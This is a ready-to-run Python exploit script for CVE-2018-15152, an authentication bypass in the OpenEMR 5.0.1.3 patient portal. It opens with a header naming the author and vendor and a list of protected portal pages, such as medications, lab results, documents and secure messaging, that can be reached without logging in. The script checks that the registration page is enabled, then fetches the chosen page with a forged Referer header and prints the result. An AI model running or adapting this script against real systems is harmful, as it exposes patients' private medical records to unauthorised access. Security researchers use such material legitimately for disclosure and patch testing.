# Exploit Title: OpenEMR 5.0.1.3 - '/portal/account/register.php' Authentication Bypass
# Date 15.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/refs/tags/v5_0_1_3.zip
# Version: All versions prior to 5.0.1.4
# Tested on: Ubuntu 18.04
# CVE: CVE-2018-15152
# CWE: CWE-287
# Documentation: https://github.com/Hacker5preme/Exploits#CVE-2018-15152-Exploit

'''
Description:
An unauthenticated user is able to bypass the Patient Portal Login by simply navigating to
the registration page and modifying the requested url to access the desired page. Some
examples of pages in the portal directory that are accessible after browsing to the
registration page include:
- add_edit_event_user.php
- find_appt_popup_user.php
- get_allergies.php
- get_amendments.php
- get_lab_results.php
- get_medications.php
- get_patient_documents.php
- get_problems.php
- get_profile.php
- portal_payment.php
- messaging/messages.php
- messaging/secure_chat.php
- report/pat_ledger.php
- report/portal_custom_report.php
- report/portal_patient_report.php
Normally, access to these pages requires authentication as a patient. If a user were to visit
any of those pages unauthenticated, they would be redirected to the login page.
'''


'''
Import required modules:
'''
import requests
import argparse


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='OpenEMR Authentication bypass')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--Openemrpath', type=str)
my_parser.add_argument('-R', '--PathToGet', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
openemr_path = args.Openemrpath
pathtoread = args.PathToGet


'''
Check for vulnerability:
'''
# Check, if Registration portal is enabled. If it is not, this exploit can not work
session = requests.Session()
check_vuln_url = 'http://' + target_ip + ':' + target_port + openemr_path + '/portal/account/register.php'
check_vuln = session.get(check_vuln_url).text
print('')
print('[*] Checking vulnerability: ')
print('')

if "Enter email address to receive registration." in check_vuln:
    print('[+] Host Vulnerable. Proceeding exploit')
else:
    print('[-] Host is not Vulnerable: Registration for patients is not enabled')

'''
Exploit:
'''
header = {
    'Referer': check_vuln_url
}
exploit_url = 'http://' + target_ip + ':' + target_port + openemr_path + pathtoread
Exploit = session.get(exploit_url, headers=header)
print('')
print('[+] Results: ')
print('')
print(Exploit.text)
print('')